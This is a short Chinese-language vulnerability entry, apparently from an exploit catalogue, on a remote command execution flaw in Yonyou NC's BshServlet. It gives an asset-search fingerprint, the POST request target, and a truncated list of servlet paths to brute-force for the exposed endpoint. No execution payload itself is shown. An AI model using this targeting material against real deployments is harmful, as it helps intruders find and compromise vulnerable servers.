# 用友NCbsh.servlet.BshServlet远程命令执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1`

**请求体 / payload**
```
爆破如下56个路径访问出现如下页面表示可能存在漏洞
/service/~aim/bsh.servlet.BshServlet
/service/~alm/bsh.servlet.BshServlet
/service/~ampub/bsh.servlet.BshServlet
/service/~arap/bsh.servlet.BshServlet
/service/~aum/bsh.servlet.BshServlet
/service/~cc/bsh.servlet.BshServlet
/service/~cdm/bsh.servlet.BshServlet
/service/~cmp/bsh.servlet.BshServlet
/service/~ct/bsh.servlet.BshServlet
/service/~dm/bsh.servlet.BshServlet
/service/~erm/bsh.servlet.BshServlet
/service/~fa/bsh.servlet.BshServlet
/service/~fac/bsh.servlet.BshServlet
/service/~fbm/bsh.servlet.BshServlet
/service/~ff/bsh.servlet.BshServlet
/service/~fip/bsh.ser…（脚本共 2338 字，完整版见原文）
```

**其他**
- 用友 NC bsh.servlet.BshServlet 远程命令执行漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友NC